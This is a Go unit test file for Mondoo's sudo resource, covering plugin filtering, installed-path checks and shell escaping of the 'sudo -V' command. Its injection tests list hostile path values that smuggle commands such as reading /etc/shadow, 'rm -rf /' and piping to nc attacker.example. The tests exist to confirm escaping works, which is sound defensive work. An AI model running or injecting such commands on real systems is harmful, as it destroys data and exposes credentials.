// Copyright Mondoo, Inc. 2024, 2026
// SPDX-License-Identifier: BUSL-1.1

package resources

import (
	"bytes"
	"strings"
	"testing"

	"github.com/spf13/afero"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.mondoo.com/mql/providers-sdk/v1/inventory"
	"go.mondoo.com/mql/providers-sdk/v1/plugin"
	"go.mondoo.com/mql/providers/os/connection/shared"
)

// newPluginRes builds a mqlSudoPlugin instance directly for unit testing.
// Bypasses CreateResource so these tests run without a runtime.
func newPluginRes(name, pluginType string) *mqlSudoPlugin {
	return &mqlSudoPlugin{
		Name: plugin.TValue[string]{Data: name, State: plugin.StateIsSet},
		Type: plugin.TValue[string]{Data: pluginType, State: plugin.StateIsSet},
	}
}

func TestPluginsOfType_FiltersByType(t *testing.T) {
	all := []any{
		newPluginRes("sudoers_io", "io"),
		newPluginRes("sudoers_policy", "policy"),
		newPluginRes("python_io", "io"),
		newPluginRes("sudoers_audit", "audit"),
	}

	io := pluginsOfType(all, "io")
	assert.Len(t, io, 2)
	assert.Equal(t, "sudoers_io", io[0].(*mqlSudoPlugin).Name.Data)
	assert.Equal(t, "python_io", io[1].(*mqlSudoPlugin).Name.Data)

	assert.Len(t, pluginsOfType(all, "policy"), 1)
	assert.Len(t, pluginsOfType(all, "audit"), 1)
}

func TestPluginsOfType_EmptyWhenNoMatch(t *testing.T) {
	all := []any{
		newPluginRes("sudoers_policy", "policy"),
	}
	got := pluginsOfType(all, "approval")
	assert.NotNil(t, got, "should be empty slice, never nil — MQL distinguishes [] from null")
	assert.Empty(t, got)
}

func TestPluginsOfType_EmptyInput(t *testing.T) {
	got := pluginsOfType([]any{}, "io")
	assert.NotNil(t, got)
	assert.Empty(t, got)
}

func TestBuildSudoVCommand_SafePaths(t *testing.T) {
	cases := map[string]string{
		"/usr/bin/sudo":          "/usr/bin/sudo -V",
		"/usr/local/bin/sudo":    "/usr/local/bin/sudo -V",
		"/opt/freeware/bin/sudo": "/opt/freeware/bin/sudo -V",
	}
	for in, want := range cases {
		t.Run(in, func(t *testing.T) {
			assert.Equal(t, want, buildSudoVCommand(in))
		})
	}
}

func TestBuildSudoVCommand_EscapesInjection(t *testing.T) {
	// Each input here is what an attacker might pass via init(path: ...).
	// The output must not allow the trailing payload to execute as a
	// separate command. We don't assert exact strings (escaping is
	// implementation detail of shared.ShellEscape), only that the
	// dangerous metacharacter ends up inside a quoted region.
	maliciousPaths := []string{
		"/tmp/evil; cat /etc/shadow",
		"/tmp/evil && rm -rf /",
		"/tmp/evil | nc attacker.example 4444",
		"/tmp/evil`cat /etc/shadow`",
		"/tmp/evil$(cat /etc/shadow)",
		"/tmp/evil > /tmp/leak",
		"/tmp/sudo with spaces",
	}
	for _, p := range maliciousPaths {
		t.Run(p, func(t *testing.T) {
			cmd := buildSudoVCommand(p)
			// The command must end with " -V" exactly — anything after
			// the escaped path is appended literally by our code.
			assert.True(t, strings.HasSuffix(cmd, " -V"),
				"command %q must end with literal ' -V'", cmd)
			// The dangerous payload must not appear unquoted: the
			// escape function wraps strings containing metacharacters
			// in single quotes.
			assert.True(t, strings.HasPrefix(cmd, "'"),
				"command %q must start with a quote to neutralize injection", cmd)
		})
	}
}

func TestBuildSudoVCommand_Empty(t *testing.T) {
	// Empty path is escaped to '' so the resulting command is harmless.
	assert.Equal(t, "'' -V", buildSudoVCommand(""))
}

// sudoTestConn is a minimal shared.Connection that exposes a controllable
// in-memory filesystem for installed() tests. RunCommand is not invoked
// by installed(), so it's stubbed.
type sudoTestConn struct {
	fs afero.Fs
}

func (c *sudoTestConn) ID() uint32                                 { return 0 }
func (c *sudoTestConn) ParentID() uint32                           { return 0 }
func (c *sudoTestConn) RunCommand(string) (*shared.Command, error) { return nil, nil }
func (c *sudoTestConn) FileInfo(string) (shared.FileInfoDetails, error) {
	return shared.FileInfoDetails{}, nil
}
func (c *sudoTestConn) FileSystem() afero.Fs              { return c.fs }
func (c *sudoTestConn) Name() string                      { return "sudo-test" }
func (c *sudoTestConn) Type() shared.ConnectionType       { return "mock" }
func (c *sudoTestConn) Asset() *inventory.Asset           { return &inventory.Asset{} }
func (c *sudoTestConn) UpdateAsset(*inventory.Asset)      {}
func (c *sudoTestConn) Capabilities() shared.Capabilities { return shared.Capability_RunCommand }

// newSudoResource builds a mqlSudo wired to an in-memory filesystem
// containing the given paths. Each path is created as a regular file
// so afero.Exists reports it as present.
func newSudoResource(t *testing.T, existingFiles ...string) *mqlSudo {
	t.Helper()
	fs := afero.NewMemMapFs()
	for _, p := range existingFiles {
		require.NoError(t, afero.WriteFile(fs, p, []byte("sudo binary"), 0o755))
	}
	return &mqlSudo{
		MqlRuntime: &plugin.Runtime{
			Connection: &sudoTestConn{fs: fs},
		},
	}
}

func TestInstalled_FalseWhenPathUnset(t *testing.T) {
	// No init args, no auto-detection: installed must be false.
	s := newSudoResource(t)
	s.Path = plugin.TValue[string]{State: plugin.StateIsSet, Data: ""}

	got, err := s.installed()
	require.NoError(t, err)
	assert.False(t, got, "empty Path should yield installed=false")
}

func TestInstalled_TrueWhenPathExistsOnDisk(t *testing.T) {
	// Real binary at the resolved path.
	s := newSudoResource(t, "/usr/bin/sudo")
	s.Path = plugin.TValue[string]{State: plugin.StateIsSet, Data: "/usr/bin/sudo"}

	got, err := s.installed()
	require.NoError(t, err)
	assert.True(t, got)
}

func TestInstalled_FalseWhenInitPathDoesNotExist(t *testing.T) {
	// Regression: previously installed() returned true for any non-empty
	// Path even if the file didn't exist on disk. With the fix, init(path:
	// "/tmp/doesnotexist") must surface as installed=false.
	s := newSudoResource(t) // empty filesystem
	s.Path = plugin.TValue[string]{State: plugin.StateIsSet, Data: "/tmp/doesnotexist"}

	got, err := s.installed()
	require.NoError(t, err)
	assert.False(t, got, "non-existent init-supplied path must report installed=false")
}

func TestInstalled_FalseWhenInitPathInjectionAttempt(t *testing.T) {
	// Defense-in-depth: even if an attacker supplies a path with shell
	// metacharacters via init(), installed() must check the literal
	// filename — not interpret the string as a shell command.
	s := newSudoResource(t, "/usr/bin/sudo") // benign sudo present
	s.Path = plugin.TValue[string]{State: plugin.StateIsSet, Data: "/tmp/evil; cat /etc/shadow"}

	got, err := s.installed()
	require.NoError(t, err)
	assert.False(t, got, "literal lookup of malicious path must fail when no such file exists")
}

// sudoBuiltinConn answers commands the way a host does when every command
// line is run as `sudo <line>`: sudo executes the first word as a program,
// so the shell builtin `command` is not found, while `sh -c` runs it.
type sudoBuiltinConn struct {
	shared.Connection
	answers map[string]string
}

func (c *sudoBuiltinConn) RunCommand(command string) (*shared.Command, error) {
	res := &shared.Command{Command: command, Stdout: &bytes.Buffer{}, Stderr: &bytes.Buffer{}}
	if out, ok := c.answers[command]; ok {
		res.Stdout = bytes.NewBufferString(out)
		return res, nil
	}
	res.Stderr = bytes.NewBufferString("sudo: " + strings.Fields(command)[0] + ": command not found\n")
	res.ExitStatus = 1
	return res, nil
}

func TestLookupViaCommandUnderSudo(t *testing.T) {
	conn := &sudoBuiltinConn{answers: map[string]string{
		"sh -c 'command -v visudo'": "/usr/local/sbin/visudo\n",
	}}
	assert.Equal(t, "/usr/local/sbin/visudo", lookupViaCommand(conn, "visudo"))
	assert.Equal(t, "", lookupViaCommand(conn, "sudo"), "not on PATH")
}
